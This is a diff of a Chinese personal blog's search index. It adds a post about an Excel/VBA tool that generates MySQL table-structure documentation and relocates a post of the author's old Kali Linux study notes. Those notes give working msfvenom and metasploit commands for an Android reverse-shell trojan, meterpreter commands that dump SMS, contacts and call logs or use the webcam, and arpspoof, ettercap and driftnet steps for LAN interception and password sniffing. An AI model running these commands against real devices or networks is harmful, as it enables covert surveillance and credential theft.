class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下</p>
+<iframe width="100%" height="500px" src="https://xuchunlei.top/gaodeMap.html"></iframe>]]></content>
+      <tags>
+        <tag>Vue.js</tag>
+        <tag>高德地图</tag>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -2052,6 +2338,86 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
+    <title>新瓶装旧酒-MySQL数据库表结构文档生成工具分享</title>
+    <url>/2024/11/15/%E6%96%B0%E7%93%B6%E8%A3%85%E6%97%A7%E9%85%92-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%BB%93%E6%9E%84%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
+    <content><![CDATA[<p><em>主要就是分享一下自己以前写的工具，可以直接跳转到最后链接获取</em></p>
+<p><em>翻开博客，发现已经快一年没有写新博客了，因为不做开发很多年了，又没有去接触新技术的想法，也就没有遇到什么要解决的问题，帮朋友做的小工具还不足以发篇博客（水是能水出来的，又不是没水过）。最近尝试修改下博客，发现一个if判断都要想半天，不加注释，自己写的都得理解半天。有时候觉得以前的自己真的很强，真的喜欢编程，把兴趣变成工作，现在不写代码多年，已经跟不上时代的步伐。以前做微信公众号的时候也是兴趣使然，看看以前写的文章是真能码字，现在没了当初的热情。一看阅读量个位数，还是朋友和自己看的吧。年底了，最近也有点自己的时间，看看以前写的文章，以前写的代码，了解一下过去的自己。对自己好点吧，自己才能好一点。</em></p>
+<p>第一次发表于2018年7月的文章-<a href="https://mp.weixin.qq.com/s/pFTuW7iR8Ex4k2WtkSPaEQ" target="_blank" rel="noopener">MySQL数据库表结构文档生成工具随笔</a>，当时正是工具第一版写出来的时候。感兴趣可以去阅读一下，挽救下个位数的阅读量。废话有点多，就基本逻辑那能看一下，直接摘抄下来。</p>
+<blockquote>
+<p>起因是想理解一下数据库结构，但是没有相应的文档，就打算边看边写。但是数据库有接近180的表，就有了写工具的想法。文档的话，首选VBA。源文件是基于Navicat for &gt;MySQL抽出的数据库结构文件。生成的结构是desc 表返回的结果去掉Extra列。<br>主要是晚上在公司写的，花费了4晚上，白天有一段时间在测试。本身难度不大，就是MySQL接触太少，有些地方需求不明确，没法实现。问朋友，也没有太明白的。本来打算实践的，不过查阅了一些资料，有了新的&gt;理解。主要有两个地方，一个是key值的设定。一个是数据类型的覆盖。</p>
+<p>Key，网上解释的都大同小异。最后从官网看的文档。MySQL官网对key的解释，版本是8.0，看了一下7.5的解释，都是一样的。链接内容如下；</p>
+<blockquote>
+<p><a href="https://dev.mysql.com/doc/refman/8.0/en/show-columns.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/show-columns.html</a></p>
+</blockquote>
+<blockquote>
+<p>Key</p>
+<p>Whether the column is indexed:</p>
+<p>•If Key is empty, the column either is not indexed or is indexed onlyas a secondary column in a multiple-column, nonunique index.</p>
+<p>•If Key is PRI, the column is a PRIMARY KEY or is one of the columnsin a multiple-column PRIMARY KEY.</p>
+<p>•If Key is UNI, the column is the first column of a UNIQUE index. (AUNIQUE index permits multiple NULL values, but you can tell whether the columnpermits NULL by &gt;checking the Null field.)</p>
+<p>•If Key is MUL, the column is the first column of a nonunique indexin which multiple occurrences of a given value are permitted within the column.</p>
+<p>If more than one of the Key values appliesto a given column of a table, Key displays the one with the highest priority,in the order PRI, UNI, MUL.</p>
+<p>A UNIQUE index may be displayed as PRI ifit cannot contain NULL values and there is no PRIMARY KEY in the table. AUNIQUE index may display as MUL if several columns &gt;form a composite UNIQUEindex; although the combination of the columns is unique, each column can stillhold multiple occurrences of a given value.</p>
+</blockquote>
+<blockquote>
+<p>列中可能存在的索引：</p>
+<p>•如果键是空的, 则该列没有索引或是非唯一索引的非第一行。</p>
+<p>•如果键是PRI，则列是主键或多列主键中的列之一。</p>
+<p>•如果键是UNI，则该列是唯一索引的第一列。(唯一索引允许多个空值，但可以通过检查Null字段来判断该列是否允许空。)</p>
+<p>•如果键为MUL，则该列是非唯一索引的第一列，其中允许在列中多次出现给定值。</p>
+<p>如果不止一个键值应用于表的给定列，则键以优先级PRI、UNI、MUL的顺序显示优先级最高的一个。</p>
+<p>如果不能包含空值且表中没有主键，则可以显示唯一索引作为PRI。如果多个列形成复合唯一索引，则唯一索引可以显示为MUL；尽管列的组合是唯一的，但每个列仍然可以保持给定值的多次出现。</p>
+</blockquote>
+<p>我的理解，也是按照下边逻辑写的，没有主键有唯一的情况未考虑：</p>
+<blockquote>
+<p>只要是主键就表示PRI。</p>
+<p>只要是单列唯一索引就表示UNI。</p>
+<p>多列组合唯一索引第一列，非唯一索引第一列表示MUL。</p>
+<p>唯一索引的非第一行，不表示。</p>
+</blockquote>
+</blockquote>
+<p>后来有几次bug修改，以及一些功能优化，添加，更新记录如下：<br><img src="/img/20241115/1.png" alt><br>1.4.0的时候出了一个插曲，完成删库成就，具体可以看下这篇文章-<a href="https://mp.weixin.qq.com/s/_WQxH-DDec8Sov5MPPPiaQ" target="_blank" rel="noopener">某码农的代码碎片5-删库跑路</a><br>最后一版还是B站go语言源代码泄露的时候改的，手动滑稽</p>
+<p>操做页面里有写，根据需要勾选选项，点按钮，选择对应的sql结构文件就行。<br><img src="/img/20241115/2.png" alt></p>
+<p>生成表结构的效果图<br><img src="/img/20241115/3.png" alt></p>
+<p>最后工具获取链接：<br><a href="https://xuchunlei.top/MySQL数据库表结构文档生成工具V1.5.0.xlsm">MySQL数据库表结构文档生成工具V1.5.0.xlsm</a></p>
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>那些年-Kali局域网msfvenom木马侵入和ARP欺骗与监听</title>
+    <url>/2025/04/28/%E9%82%A3%E4%BA%9B%E5%B9%B4-Kali%E5%B1%80%E5%9F%9F%E7%BD%91msfvenom%E6%9C%A8%E9%A9%AC%E4%BE%B5%E5%85%A5%E5%92%8CARP%E6%AC%BA%E9%AA%97%E4%B8%8E%E7%9B%91%E5%90%AC/</url>
+    <content><![CDATA[<p><em>kali学得好，牢饭吃到饱。<br>因为硬盘空间不多了，就想着把些没用的文件清理掉，就看到了KaliLinux的虚拟机有11G。几年前(20200629)学习过一点点，还能找到当时的记录，只能算自娱自乐，实施是不可能实施的。简单整理下当时的记录，也有些懵懂了，看情况把KaliLinux虚拟机干掉，毕竟很老了</em></p>
+<p><img src="/img/20250428/0.png" alt></p>
+<h3 id="必须开启root和密码-大概"><a href="#必须开启root和密码-大概" class="headerlink" title="必须开启root和密码 大概"></a>必须开启root和密码 大概</h3><p><img src="/img/20250428/1.png" alt></p>
+<h3 id="msfvenom木马侵入"><a href="#msfvenom木马侵入" class="headerlink" title="msfvenom木马侵入"></a>msfvenom木马侵入</h3><p>fping探查局域网接入设备IP<br><img src="/img/20250428/2.png" alt></p>
+<p>nmap扫描⽬标主机系统<br><img src="/img/20250428/3.png" alt></p>
+<p>生成木马 手机用 （-p载荷，LHOST本机IP，LPORT反向连接到主机的端口，R &gt;保存路径名字）<br>也能生成电脑用的exe文件<br><code>sfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.88.233 LPORT=5555 R &gt; /root/shell.apk</code><br><img src="/img/20250428/4.png" alt></p>
+<p>植入基本没戏，也就在自己手机上弄弄。安装会报毒，权限没给的话好多又用不了。<br><img src="/img/20250428/5.jpg" alt><br><img src="/img/20250428/6.jpg" alt></p>
+<p>植入成功的话，启动metasploit开始监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmsfconsole</span><br><span class="line">use exploit/multi/handler #设置模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp #设置载荷</span><br><span class="line">set lhost 192.168.88.233 #设置本机IP</span><br><span class="line">set lport 5555 #设置端口</span><br><span class="line">exploit #执行攻击</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/20250428/7.png" alt></p>
+<p>获取系统信息，摄像头拍照，通讯记录<br><img src="/img/20250428/8.png" alt></p>
+<p>一些命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? 查看更多命令</span><br><span class="line">cd --&gt;目录切换，命令：cd / 切换到根目录</span><br><span class="line">search --&gt;搜索文件，命令：search text.jpg</span><br><span class="line">download --&gt;下载文件，命令：download test.jpg</span><br><span class="line">webcam_list --&gt;查看摄像头列表，因为手机都是前置和后置摄像头了</span><br><span class="line">webcam_snap --&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1</span><br><span class="line">webcam_stream --&gt;开启摄像头视频监控，同上，命令：webcam_stream -i 1</span><br><span class="line">安卓系统相关命令：</span><br><span class="line">check_root --&gt;查看当前安卓是否已经root</span><br><span class="line">dump_calllog --&gt;下载通话记录</span><br><span class="line">dump_contacts --&gt;下载通讯录</span><br><span class="line">dump_sms --&gt;下载短信记录</span><br><span class="line">geolocate --&gt;利用谷歌地图定位（需要安装谷歌地图）</span><br></pre></td></tr></table></figure>
+
+<h3 id="ARP欺骗与监听"><a href="#ARP欺骗与监听" class="headerlink" title="ARP欺骗与监听"></a>ARP欺骗与监听</h3><p>#检查自己的网卡信息和网关<br><img src="/img/20250428/9.png" alt></p>
+<p>ARP欺骗 （-i 网卡名 -t 目标主机 网关(主机和网关可交换或者-r双向攻击)）<br><code>arpspoof -i eth0 -t 192.168.88.77 192.168.88.1</code><br>arpspoof 是 dsniff 的一个附属工具，安装dsniff即可<br><code>apt-get install dsniff</code><br><img src="/img/20250428/10.png" alt></p>
+<p>之前阿里企业邮箱网址http还是不带s的<br><img src="/img/20250428/11.png" alt></p>
+<p>开启端口转发（0流量截断，断网 1流量转发）<br><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code>（临时，每次重启终端其内容会自动变为0。永久，需要修改/etc/sysctl.conf文件，net.ipv4.ip_forward = 1）<br>使用ettercap抓取HTTP提交的账号密码（-T文本模式运行 -q安静模式 -i网卡）<br><code>ettercap -Tq -i eth0</code><br>可以轻松获取输入的用户名和密码信息<br><img src="/img/20250428/12.png" alt></p>
+<p>ARP欺骗（这里网关为目标，不然还是不能联网）<br><code>arpspoof -i eth0 -t 192.168.88.1 192.168.88.77</code></p>
+<p><code>apt-get install driftnet</code><br>使用Driftnet从网络流量捕获图像（-i网卡 -d保存路径 -a后台运行）<br><code>driftnet -i eth0 -d /home/xuchl/arpImg -a</code><br>可以看到微信传输的一些图片，或者使用Wireshark来对其他包进行抓取<br><img src="/img/20250428/13.png" alt></p>
+<p>基本只是复制粘贴以前记录的文本和图片，实际参考意义不大，记录用。</p>
+]]></content>
+      <tags>
+        <tag>KaliLinux</tag>
+        <tag>黑客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>虚拟机模拟Linux服务器</title>
     <url>/2020/02/07/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A8%A1%E6%8B%9FLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
     <content><![CDATA[<h1 id="虚拟机模拟Linux服务器"><a href="#虚拟机模拟Linux服务器" class="headerlink" title="虚拟机模拟Linux服务器"></a>虚拟机模拟Linux服务器</h1><p><em>通过虚拟机简单模拟通过SSH远程连接Linux服务器，实际上服务器需要很多配置，比如安全方面。</em></p>
@@ -2175,37 +2541,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       <tags>
         <tag>Excel</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>那些年-Kali局域网msfvenom木马侵入和ARP欺骗与监听</title>
-    <url>/2025/04/28/%E9%82%A3%E4%BA%9B%E5%B9%B4-Kali%E5%B1%80%E5%9F%9F%E7%BD%91msfvenom%E6%9C%A8%E9%A9%AC%E4%BE%B5%E5%85%A5%E5%92%8CARP%E6%AC%BA%E9%AA%97%E4%B8%8E%E7%9B%91%E5%90%AC/</url>
-    <content><![CDATA[<p><em>kali学得好，牢饭吃到饱。<br>因为硬盘空间不多了，就想着把些没用的文件清理掉，就看到了KaliLinux的虚拟机有11G。几年前(20200629)学习过一点点，还能找到当时的记录，只能算自娱自乐，实施是不可能实施的。简单整理下当时的记录，也有些懵懂了，看情况把KaliLinux虚拟机干掉，毕竟很老了</em></p>
-<p><img src="/img/20250428/0.png" alt></p>
-<h3 id="必须开启root和密码-大概"><a href="#必须开启root和密码-大概" class="headerlink" title="必须开启root和密码 大概"></a>必须开启root和密码 大概</h3><p><img src="/img/20250428/1.png" alt></p>
-<h3 id="msfvenom木马侵入"><a href="#msfvenom木马侵入" class="headerlink" title="msfvenom木马侵入"></a>msfvenom木马侵入</h3><p>fping探查局域网接入设备IP<br><img src="/img/20250428/2.png" alt></p>
-<p>nmap扫描⽬标主机系统<br><img src="/img/20250428/3.png" alt></p>
-<p>生成木马 手机用 （-p载荷，LHOST本机IP，LPORT反向连接到主机的端口，R &gt;保存路径名字）<br>也能生成电脑用的exe文件<br><code>sfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.88.233 LPORT=5555 R &gt; /root/shell.apk</code><br><img src="/img/20250428/4.png" alt></p>
-<p>植入基本没戏，也就在自己手机上弄弄。安装会报毒，权限没给的话好多又用不了。<br><img src="/img/20250428/5.jpg" alt><br><img src="/img/20250428/6.jpg" alt></p>
-<p>植入成功的话，启动metasploit开始监听</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmsfconsole</span><br><span class="line">use exploit/multi/handler #设置模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp #设置载荷</span><br><span class="line">set lhost 192.168.88.233 #设置本机IP</span><br><span class="line">set lport 5555 #设置端口</span><br><span class="line">exploit #执行攻击</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/20250428/7.png" alt></p>
-<p>获取系统信息，摄像头拍照，通讯记录<br><img src="/img/20250428/8.png" alt></p>
-<p>一些命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? 查看更多命令</span><br><span class="line">cd --&gt;目录切换，命令：cd / 切换到根目录</span><br><span class="line">search --&gt;搜索文件，命令：search text.jpg</span><br><span class="line">download --&gt;下载文件，命令：download test.jpg</span><br><span class="line">webcam_list --&gt;查看摄像头列表，因为手机都是前置和后置摄像头了</span><br><span class="line">webcam_snap --&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1</span><br><span class="line">webcam_stream --&gt;开启摄像头视频监控，同上，命令：webcam_stream -i 1</span><br><span class="line">安卓系统相关命令：</span><br><span class="line">check_root --&gt;查看当前安卓是否已经root</span><br><span class="line">dump_calllog --&gt;下载通话记录</span><br><span class="line">dump_contacts --&gt;下载通讯录</span><br><span class="line">dump_sms --&gt;下载短信记录</span><br><span class="line">geolocate --&gt;利用谷歌地图定位（需要安装谷歌地图）</span><br></pre></td></tr></table></figure>
-
-<h3 id="ARP欺骗与监听"><a href="#ARP欺骗与监听" class="headerlink" title="ARP欺骗与监听"></a>ARP欺骗与监听</h3><p>#检查自己的网卡信息和网关<br><img src="/img/20250428/9.png" alt></p>
-<p>ARP欺骗 （-i 网卡名 -t 目标主机 网关(主机和网关可交换或者-r双向攻击)）<br><code>arpspoof -i eth0 -t 192.168.88.77 192.168.88.1</code><br>arpspoof 是 dsniff 的一个附属工具，安装dsniff即可<br><code>apt-get install dsniff</code><br><img src="/img/20250428/10.png" alt></p>
-<p>之前阿里企业邮箱网址http还是不带s的<br><img src="/img/20250428/11.png" alt></p>
-<p>开启端口转发（0流量截断，断网 1流量转发）<br><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code>（临时，每次重启终端其内容会自动变为0。永久，需要修改/etc/sysctl.conf文件，net.ipv4.ip_forward = 1）<br>使用ettercap抓取HTTP提交的账号密码（-T文本模式运行 -q安静模式 -i网卡）<br><code>ettercap -Tq -i eth0</code><br>可以轻松获取输入的用户名和密码信息<br><img src="/img/20250428/12.png" alt></p>
-<p>ARP欺骗（这里网关为目标，不然还是不能联网）<br><code>arpspoof -i eth0 -t 192.168.88.1 192.168.88.77</code></p>
-<p><code>apt-get install driftnet</code><br>使用Driftnet从网络流量捕获图像（-i网卡 -d保存路径 -a后台运行）<br><code>driftnet -i eth0 -d /home/xuchl/arpImg -a</code><br>可以看到微信传输的一些图片，或者使用Wireshark来对其他包进行抓取<br><img src="/img/20250428/13.png" alt></p>
-<p>基本只是复制粘贴以前记录的文本和图片，实际参考意义不大，记录用。</p>
-]]></content>
-      <tags>
-        <tag>KaliLinux</tag>
-        <tag>黑客</tag>
       </tags>
   </entry>
 </search>
